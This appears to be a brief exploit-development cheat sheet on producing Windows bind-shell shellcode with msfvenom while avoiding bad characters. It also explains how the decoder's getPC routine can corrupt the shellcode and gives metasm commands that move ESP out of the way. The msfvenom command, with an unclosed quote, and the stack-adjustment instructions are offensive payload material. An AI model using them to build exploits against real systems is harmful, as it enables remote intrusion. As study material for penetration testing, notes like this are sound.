# Shellcode without given bad characters

```
msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d
```

> Msfvenomâ€™s encoded shellcode needs to first decode itself before executing, and as part of the decoding process, it needs to find its location in memory using a routine called getPC. A common technique for finding the current location in memory includes using an instruction called FSTENV, which writes a structure onto the stack, overwriting whatâ€™s thereâ€”in our case part of the shellcode. All we need to do to fix this is move ESP away from the shellcode, so getPC has room to work without corrupting our shellcode. (The problem in general is that if the values in EIP and ESP are too close together, shellcode tends to corrupt itself, either during decoding or during execution.)

./metasm_shell.rb
metasm > sub esp, 1500
metasm > add esp, -1500
